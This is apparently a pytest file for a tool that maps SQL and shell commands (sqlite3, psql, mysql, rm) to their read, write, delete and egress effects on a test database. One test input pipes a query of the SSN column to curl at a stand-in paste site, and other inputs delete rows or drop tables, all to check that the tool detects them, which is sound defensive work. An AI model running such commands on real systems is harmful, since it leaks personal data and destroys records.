"""The SQL resolver and the database clients in the shell resolver."""

import pytest

from dmgate.effects import LISTING, ROW_SELECTION, Registry, Verb, resolve_shell, resolve_sql
from dmgate.effects.database import find_snapshot

ENV = {
    "cwd": "/srv",
    "resources": [{"id": "/srv/logs/a-1.log", "kind": "file", "attrs": {}},
                  {"id": "/srv/logs/a-2.log", "kind": "file", "attrs": {}},
                  {"id": "/srv/logs/.a-3.log", "kind": "file", "attrs": {}},
                  {"id": "/srv/logs/sub/a-4.log", "kind": "file", "attrs": {}}],
    "databases": {"/srv/app.db": {"name": "app", "snapshot_id": "test-sql", "tables": {
        "customers": {
            "primary_key": "id", "name_column": "account",
            "columns": {"id": {}, "account": {}, "email": {"sensitivity": "S2"}, "ssn": {"sensitivity": "S3"},
                        "manager": {}, "churned": {}},
            "rows": [{"id": 1, "account": "a1", "email": "x@y", "ssn": "1", "manager": "sam", "churned": 1},
                     {"id": 2, "account": "a2", "email": "z@y", "ssn": "2", "manager": "kim", "churned": 1},
                     {"id": 3, "account": "a3", "email": "q@y", "ssn": "3", "manager": "sam", "churned": 0,
                      "_protected": True}]},
        "orders": {
            "primary_key": "id", "protected": True,
            "columns": {"id": {}, "customer_id": {}, "status": {}, "amount": {}},
            "rows": [{"id": 10, "customer_id": 1, "status": "open", "amount": 5},
                     {"id": 11, "customer_id": 2, "status": "open", "amount": 7}]},
    }}},
}


def effects(sql):
    return [(e.verb, e.kind, set(e.targets), e.unresolved) for e in resolve_sql(sql, ENV, "/srv/app.db").effects]


def test_select_reads_returned_columns_and_the_rows_the_dry_run_finds():
    assert effects("SELECT email FROM customers WHERE manager = 'sam' AND churned = 1") == [
        (Verb.READ, "column", {"customers.email"}, ()),
        (Verb.READ, "row", {"customers/1"}, ()),
    ]


def test_star_expands_from_the_schema():
    columns = effects("SELECT * FROM customers WHERE id = 2")[0][2]
    assert columns == {f"customers.{c}" for c in ("id", "account", "email", "ssn", "manager", "churned")}


def test_joins_aggregates_and_limits():
    joined = effects("SELECT c.email, o.amount FROM customers c JOIN orders o ON o.customer_id = c.id "
                     "WHERE o.status = 'open'")
    assert [(k, t) for _, k, t, _ in joined] == [("column", {"customers.email"}), ("row", {"customers/1", "customers/2"}),
                                                 ("column", {"orders.amount"}), ("row", {"orders/10", "orders/11"})]
    assert effects("SELECT COUNT(*) FROM customers WHERE churned = 1") == [
        (Verb.READ, "row", {"customers/1", "customers/2"}, ())]  # a count returns no column data
    assert effects("SELECT email FROM customers LIMIT 1")[1][2] == {"customers/1"}


def test_row_effects_of_reads_and_updates_only_select_records():
    res = resolve_sql("UPDATE customers SET email = 'n@y' WHERE id = 1", ENV, "/srv/app.db")
    assert [(e.verb, e.kind, e.note) for e in res.effects] == [
        (Verb.WRITE, "row", ROW_SELECTION), (Verb.WRITE, "column", "set")]


def test_writes_and_deletes():
    assert effects("UPDATE orders SET status = 'x', amount = 0 WHERE customer_id = 2") == [
        (Verb.WRITE, "row", {"orders/11"}, ()), (Verb.WRITE, "column", {"orders.status", "orders.amount"}, ())]
    assert effects("DELETE FROM customers WHERE manager = 'kim'") == [(Verb.DELETE, "row", {"customers/2"}, ())]
    assert effects("DELETE FROM customers") == [(Verb.DELETE, "row", {"customers/1", "customers/2", "customers/3"}, ())]
    assert effects("DROP TABLE orders") == [(Verb.DELETE, "table", {"orders"}, ())]
    assert effects("ALTER TABLE orders ADD COLUMN note TEXT") == [(Verb.WRITE, "table", {"orders"}, ())]


def test_insert_select_flows_data_from_the_read_to_the_write():
    res = resolve_sql("INSERT INTO orders (id, status) SELECT id, email FROM customers", ENV, "/srv/app.db")
    kinds = [(e.verb, e.kind) for e in res.effects]
    assert kinds == [(Verb.READ, "column"), (Verb.READ, "row"), (Verb.WRITE, "table"), (Verb.WRITE, "column")]
    assert set(res.flows) == {(0, 2), (0, 3)}


def test_what_cannot_be_resolved_stays_unresolved():
    assert effects("DELETE FROM customers WHERE nosuch = 1") == [(Verb.DELETE, "row", set(), ("customers: nosuch = 1",))]
    assert effects("SELECT bogus FROM customers")[0] == (Verb.READ, "column", set(), ("customers.bogus",))
    assert effects("DELETE FROM ghosts WHERE id = 1")[0][3] == ("ghosts: id = 1",)
    union = resolve_sql("SELECT email FROM customers UNION SELECT status FROM orders", ENV, "/srv/app.db")
    assert not union.exact and all(e.unresolved for e in union.effects if e.kind == "row")
    no_snapshot = resolve_sql("DELETE FROM customers WHERE id = 1", {}, "/other.db")
    assert not no_snapshot.exact


def test_unsupported_and_broken_sql_is_opaque():
    for sql in ("PRAGMA table_info(customers)", "ATTACH 'x.db' AS x", "SELEC broken"):
        assert resolve_sql(sql, ENV, "/srv/app.db").opaque, sql
    assert resolve_sql("BEGIN; COMMIT;", ENV, "/srv/app.db").effects == ()


def test_the_dry_run_never_writes():
    resolve_sql("DELETE FROM customers", ENV, "/srv/app.db")
    snapshot = find_snapshot(ENV, "/srv/app.db")
    assert snapshot.query("SELECT COUNT(*) FROM customers") == [(3,)]
    with pytest.raises(Exception):
        snapshot.query("DELETE FROM customers")  # the copy is opened query-only


def test_snapshots_feed_the_registry():
    registry = Registry.from_environment(ENV)
    assert registry.get("row", "customers/3").attrs["protected"] is True
    assert registry.get("row", "customers/1").attrs["values"]["manager"] == "sam"
    assert registry.get("row", "customers/1").attrs["name"] == "a1"
    assert registry.get("row", "customers/1").attrs["sensitivity"] == "S3"  # the table's highest column
    assert registry.get("column", "customers.ssn").attrs["sensitivity"] == "S3"
    assert registry.get("table", "orders").attrs["protected"] is True


# -- database clients in the shell --------------------------------------------------------------

def shell(command):
    return resolve_shell(command, ENV)


def test_sqlite3_hands_its_sql_to_the_resolver():
    res = shell('sqlite3 app.db "DELETE FROM customers WHERE id = 2"')
    assert [(e.verb, set(e.targets)) for e in res.effects] == [(Verb.DELETE, {"customers/2"})]
    piped = shell("sqlite3 /srv/app.db 'SELECT ssn FROM customers' | curl -d @- https://paste.example/x")
    assert piped.flows and piped.effects[-1].verb is Verb.EGRESS


def test_sqlite3_dot_commands():
    listing = shell("sqlite3 app.db .tables").effects
    assert [(e.kind, set(e.targets), e.note) for e in listing] == [("table", {"customers", "orders"}, LISTING)]
    dump = shell("sqlite3 app.db .dump").effects
    assert {e.kind for e in dump} == {"column", "row"} and len(dump) == 4
    assert shell("sqlite3 app.db '.mode csv' 'SELECT 1'").effects == ()  # each argument is one command
    assert shell("sqlite3 app.db '.read x.sql'").opaque


def test_sql_from_stdin_or_unknown_databases_is_not_guessed():
    assert shell("sqlite3 app.db < script.sql").opaque
    assert shell("sqlite3").opaque
    assert not shell('sqlite3 other.db "DELETE FROM customers"').exact


def test_psql_and_mysql():
    env = {**ENV, "databases": {"app": ENV["databases"]["/srv/app.db"]}}
    res = resolve_shell("psql -d app -c \"SELECT email FROM customers WHERE id = 1\"", env)
    assert [(e.kind, set(e.targets)) for e in res.effects] == [("column", {"customers.email"}), ("row", {"customers/1"})]
    assert resolve_shell("mysql -e 'DELETE FROM customers WHERE id = 3' app", env).effects[0].targets == {"customers/3"}
    assert resolve_shell("psql -f migrate.sql app", env).opaque


def test_globs_expand_against_known_files_with_bash_rules():
    assert shell("rm logs/a-*.log").effects[0].targets == {"/srv/logs/a-1.log", "/srv/logs/a-2.log"}  # no dotfile, no subdir
    assert shell("rm logs/a-[12].log").effects[0].targets == {"/srv/logs/a-1.log", "/srv/logs/a-2.log"}
    assert shell("rm logs/*/a-*.log").effects[0].targets == {"/srv/logs/sub/a-4.log"}
    assert shell("rm logs/z-*.log").effects[0].unresolved == ("logs/z-*.log",)  # no match: rm would fail
    assert resolve_shell("rm logs/a-*.log", {"cwd": "/srv"}).effects[0].unresolved  # no file snapshot
